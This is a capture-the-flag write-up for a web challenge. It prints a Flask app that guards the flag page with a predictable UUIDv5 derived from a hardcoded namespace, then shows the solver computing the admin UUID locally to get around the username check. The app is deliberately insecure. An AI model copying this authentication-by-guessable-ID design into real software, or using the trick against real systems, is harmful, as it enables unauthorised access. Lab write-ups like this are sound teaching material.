# Passwordless

Category: WEB

Points: 100

Solves: xxx

>Tired of storing passwords? No worries! This super secure website is passwordless!

### Solution

```py
#!/usr/bin/env python3
from flask import Flask, request, redirect, render_template, render_template_string
import subprocess
import urllib
import uuid
global leet

app = Flask(__name__)
flag = open('/flag.txt').read()
leet=uuid.UUID('13371337-1337-1337-1337-133713371337')

@app.route('/',methods=['GET','POST'])
def main():
    global username
    if request.method == 'GET':
        return render_template('index.html')
    elif request.method == 'POST':
        username = request.values['username']
        if username == 'admin123':
            return 'Stop trying to act like you are the admin!'
        uid = uuid.uuid5(leet,username) # super secure!
        return redirect(f'/{uid}')

@app.route('/<uid>')
def user_page(uid):
    if uid != str(uuid.uuid5(leet,'admin123')):
        return f'Welcome! No flag for you :('
    else:
        return flag

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=1337)
```

Looking at the code, it seems like they use a super 1337 seed! When we login with a username it will generate a UUID for us. However, we only can access the flag with `admin123` UUID but we can't use the username `admin123`. Luckily, we can just create the UUID locally!

```py
>>> import uuid
>>> leet=uuid.UUID('13371337-1337-1337-1337-133713371337')
>>> uid = uuid.uuid5(leet,"admin123")
>>> uid
UUID('3c68e6cc-15a7-59d4-823c-e7563bbb326c')
```

Bam! `3c68e6cc-15a7-59d4-823c-e7563bbb326c`

![Website](/images/Passwordless.png)


### Flag

```n00bz{1337-13371337-1337-133713371337-1337}```